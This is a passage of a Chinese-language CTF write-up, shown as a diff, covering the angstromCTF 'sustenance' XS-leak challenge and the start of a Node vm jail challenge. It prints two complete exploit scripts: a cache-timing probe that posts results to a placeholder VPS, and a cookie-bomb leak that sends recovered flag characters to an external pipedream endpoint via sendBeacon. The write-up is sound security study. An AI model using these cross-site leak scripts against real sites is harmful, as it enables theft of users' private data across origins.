@@ -1,0 +1,239 @@
+而最大的問題是 Chrome 現在有 [cache partitioning](https://developer.chrome.com/blog/http-cache-partitioning/)，新開的頁面的 cache key 是：`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，但假設我自己開個 ngrok 裡面用 fetch，cache key 會是：`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`，cache key 是不同的，所以抓不到 cache。
+
+我跟隊友也有討論過既然可以設定 cookie，那是不是可以利用 [cookie bomb](https://blog.huli.tw/2021/07/10/cookie-bomb/) 來做事，但討論過後我們也沒找出什麼方法。
+
+接著我嘗試利用 [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html) 中的方法，用 `a:visited` 去洩露 history，改了一下上面這篇的 POC 以後可以動，但丟去 admin bot 發現無效。自己在本機測了一下，發現應該是因為 headless 的關係，不管怎樣 render 的時間都是 16ms。
+
+試到沒什麼招了以後，[lebr0nli](https://lebr0nli.github.io/blog/) 貼了一個利用 cache probing 的 POC，是從 [maple 的 writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault) 中看來的，而重點是「這個 POC 可以利用別的題目，藉此跑在 same site 上面」，例如說另一題的網址是 `https://xtra-salty-sardines.web.actf.co/`，從這邊用 fetch 的話，cache key 也會是 `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，因為 cache key 只看 eTLD+1，所以 same site 的網站，cache key 也會一樣。
+
+但他碰到的問題是 local 可以跑，可是在 remote 上面怎麼樣都是 false positive。於是我照著他的 POC 改了一下，試著多回傳一些數字，發現問題出在 server 跑得異常的快。舉例來說，有 cache 的要 3ms，沒有 cache 的也只要 5ms，相差極少，連 timestamp 的部分也是，大概是 `window.open` 之後 10ms 以內。
+
+因此我修改了一下程式碼，直接在遠端計算有 cache 的平均時間，就順利 leak 出了 flag，程式碼如下：
+
+https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722
+
+``` js
+// to hang the connection
+fetch('https://deelay.me/20000/https://example.com')
+
+// NOTE: we will calculate this baseline before doing the attack
+var baseLine = 3.2
+const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))
+
+go()
+async function go() {
+  await calculateBaseline()
+  main()
+
+  async function calculateBaseline() {
+    var m = Math.random()
+    let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m)
+    
+    // NOTE: this number can be decreased by detecting window load
+    await sleep(500)
+    win.close()
+    let total = 0
+    for(let i=1; i<=5; i++) {
+      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m)
+      total += ts
+      report(`Cached time, round: ${i}, ${ts}ms`)
+    }
+    // NOTE: 0.5 is just a random guess
+    baseLine = (total/5) + 0.5
+    report(`Baseline: ${baseLine}`)
+    
+    // NOTE: adjust baseline, should not be more than 3 ms based on previous testing
+    if (baseLine > 3) {
+      baseLine = 3
+    }
+    for(let i=1; i<=3; i++) {
+      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m)
+      report(`Not Cached time, round: ${i}, ${ts}ms`)
+    }
+  }
+
+  // NOTE: server is quite fast so no need to set timeout
+  async function getLoadTime(url) {
+    const start = performance.now()
+    await fetch(url, { cache: 'force-cache', mode: 'no-cors' })
+    return performance.now() - start
+  }
+
+  function genSucceedUrl(t) {
+    let ft = t + ''
+    while(ft.length < 13) {
+      ft += '0'
+    }
+    const status = "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
+    return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at ${ft} has ${status}`);
+  }
+
+  async function isCached(str) {
+    let start = +new Date()
+    let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str))
+    await sleep(500)
+    win.close()
+    
+    // NOTE: base on the data collected, i should be 1~20, pretty small number
+    for(let i=1; i<=30; i++) {
+      const url = genSucceedUrl(start + i)
+      let loadTime = await getLoadTime(url)
+      if (loadTime <= baseLine) {
+        
+        // NOTE: check again to see if it really meets the condition
+        let total = 0
+        for(let j=1; j<=3; j++) {
+          total += await getLoadTime(url)
+        }
+        total/=3
+        if (total <= baseLine) {
+          report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`)
+          return true
+        }
+      }
+    }
+    return false
+  }
+
+  async function main() {
+    let flag = 'actf{yummy_'
+    
+    // NOTE: we can leak the charset first to speed up the process
+    let chars = 'acefsmntuy_}'.split('')
+    while(flag[flag.length - 1] !== '}') {
+      for(let char of chars) {
+        report('trying:'  + flag + char)
+        if (await isCached(flag + char)) {
+          flag += char
+          report('flag:' + flag)
+          break
+        }
+      }
+    }
+  }
+
+  async function report(data) {
+    console.log(data)
+    // TODO: change to your VPS
+    return fetch('https://YOUR_VPS/', { method: 'POST', body: data, mode: 'no-cors' }).catch(err => err);
+  }
+}
+```
+
+我們可以先 leak 出 charset，速度就會快很多。上面還有些小地方可以再調整的，整體速度應該會再更快。
+
+後來隊友也有貼了另外一篇 writeup：[UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked)，從中得知 headless chrome 目前是沒有 cache partitioning 的。
+
+我自己實際測了一下，發現到現在還是這樣，所以這題其實不需要借用其他題目，自己架個 ngrok 就可以搞定。
+
+### 預期解
+
+預期解應該就是我上面說過的 cookie bomb，先設置一大堆 cookie，然後利用成功跟失敗的 url 網址不同這個特性，如果成功的話 url 會比較長，request 就會太大，server 就會回錯誤，失敗的話就不會有事。
+
+底下的 script 來自 Strellic，一樣要借用其他題目來跑在 same site 上面：
+
+``` html
+<>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
+<script>
+    const $ = document.querySelector.bind(document);
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+    let i = 0;
+    const stuff = async (len=3500) => {
+        let name = Math.random();
+        $("form").target = name;
+        let w = window.open('', name);
+        $("#f").value = "_".repeat(len);
+        $("#f").name = i++;
+        $("form").submit();
+        await sleep(100);
+    };
+    const isError = async (url) => {
+        return new Promise(r => {
+            let script = document.createElement('script');
+            script.src = url;
+            script.onload = () => r(false);
+            script.onerror = () => r(true);
+            document.head.appendChild(script);
+        });
+    }
+    const search = (query) => {
+        return isError("https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query));
+    };
+    const alphabet = "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ";
+    const url = "//en4u1nbmyeahu.x.pipedream.net/";
+    let known = "actf{";
+    window.onload = async () => {
+        navigator.sendBeacon(url + "?load");
+        await Promise.all([stuff(), stuff(), stuff(), stuff()]);
+        await stuff(1600);
+        navigator.sendBeacon(url + "?go");
+        while (true) {
+            for (let c of alphabet) {
+                let query = known + c;
+                if (await search(query)) {
+                    navigator.sendBeacon(url, query);
+                    known += c;
+                    break;
+                }
+            }
+        }
+    };
+</script>
+```
+
+這邊有幾個細節要知道：
+
+1. request 太大的話 server 會回錯誤
+2. 因為是 same site，所以 `<script>` 發 request 時會自動帶 cookie
+3. 利用 script 的 event 來偵測 http status code 是不是成功
+
+當初卡關是因為：
+
+1. 沒想到可以利用其他題目來繞過 same site cookie
+2. 沒注意到 request URL 也包含在長度裡面，只想到 header/body
+
+## misc/CaaSio PSE
+
+這題是限制很嚴格的 js jail，題目長這樣：
+
+``` js
+#!/usr/local/bin/node
+
+// flag in ./flag.txt
+
+const vm = require("vm");
+const readline = require("readline");
+
+const interface = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+});
+
+interface.question(
+    "Welcome to CaaSio: Please Stop Edition! Enter your calculation:\n",
+    function (input) {
+        interface.close();
+        if (
+            input.length < 215 &&
+            /^[\x20-\x7e]+$/.test(input) &&
+            !/[.\[\]{}\s;`'"\\_<>?:]/.test(input) &&
+            !input.toLowerCase().includes("import")
+        ) {
+            try {
+                const val = vm.runInNewContext(input, {});
+                console.log("Result:");
+                console.log(val);
+                console.log(
+                    "See, isn't the calculator so much nicer when you're not trying to hack it?"
+                );
+            } catch (e) {
+                console.log("your tried");
+            }
+        } else {
+            console.log(
+                "Third time really is the charm! I've finally created an unhackable system!"
+            );
+        }
+    }
+);
+```
